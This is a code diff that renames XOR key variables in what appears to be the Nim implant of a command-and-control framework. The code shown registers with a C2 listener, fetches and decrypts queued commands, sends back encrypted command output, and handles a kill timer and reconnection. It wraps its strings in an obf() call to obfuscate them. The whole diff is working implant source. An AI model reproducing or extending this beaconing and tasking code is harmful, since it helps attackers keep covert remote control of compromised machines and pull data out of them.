@@ -7,7 +7,7 @@ import ../config/configParser
 import tables
 
 # Define the object with listener properties
-const xor_key {.intdefine.}: int = 459457925
+const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
 
 type
     Listener* = object
@@ -165,7 +165,7 @@ proc init*(li: var Listener) : void =
         
     if res.code == 200:
         li.id = parseJson(res.body)["id"].getStr()
-        li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
+        li.UNIQUE_XOR_KEY = xorString(base64.decode(parseJson(res.body)["k"].getStr()), INITIAL_XOR_KEY)
         li.initialized = true
         
         when defined verbose:
@@ -196,7 +196,7 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
     when defined verbose:
         echo obf("DEBUG: Data to send (unencrypted): ") & dataStr
     
-    let encryptedData = encryptData(dataStr, li.cryptKey)
+    let encryptedData = encryptData(dataStr, li.UNIQUE_XOR_KEY)
     
     when defined verbose:
         echo obf("DEBUG: Encrypted data (first 20 characters): ") & 
@@ -250,7 +250,7 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     else:
         try:
             # Attempt to parse task (parseJson() needs string literal... sigh)
-            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey) #.replace("\'", "\\\"")
+            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.UNIQUE_XOR_KEY) #.replace("\'", "\\\"")
             var parsedResponseData = parseJson(responseData)
             var jsonData = to(parsedResponseData, Command)
 
@@ -269,7 +269,7 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
 # Return command results via POST request to the result path
 proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
-    discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey), "post")
+    discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
 
 # Announce that the kill timer has expired
 proc killSelf*(li : Listener) : void =
@@ -329,7 +329,7 @@ proc reconnect*(li: var Listener) : void =
             # such as a new cryptographic key if sent
             if res.body.len > 0:
                 try:
-                    li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
+                    li.UNIQUE_XOR_KEY = xorString(base64.decode(parseJson(res.body)["k"].getStr()), INITIAL_XOR_KEY)
                     when defined verbose:
                         echo obf("DEBUG: New cryptographic key obtained from server")
                 except:
